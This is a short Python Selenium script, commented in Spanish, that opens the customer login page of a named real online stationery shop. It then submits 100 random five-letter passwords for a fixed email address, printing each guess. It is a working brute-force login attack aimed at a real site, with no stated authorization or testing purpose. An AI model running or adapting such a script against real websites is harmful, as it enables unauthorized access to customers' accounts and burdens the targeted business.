import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("https://www.entrelineaspapeleria.cl/account/login?return_url=%2Faccount") #para que se abra la pagina 
time.sleep(5) #el time es para que el sitio pueda cargar tranquilo
letters = string.ascii_lowercase
for x in range(100):
    usr = driver.find_element_by_id("CustomerEmail") #id del input en la pagina html
    usr.clear() #como para limpiar el caché
    usr.send_keys("asdf@yahoo.com")
    psw = driver.find_element_by_id("CustomerPassword") #id de la pw en la pagina html
    str = ''.join(random.choice(letters) for i in range(5)) #genera clave random con minimo 5, por temas de la pagina
    psw.send_keys(str)#envio el string
    print(str) 
    clk = driver.find_element_by_xpath("//*[@id='customer_login']/p[1]/button").click() #xpath del boton para que se haga click en la pagina
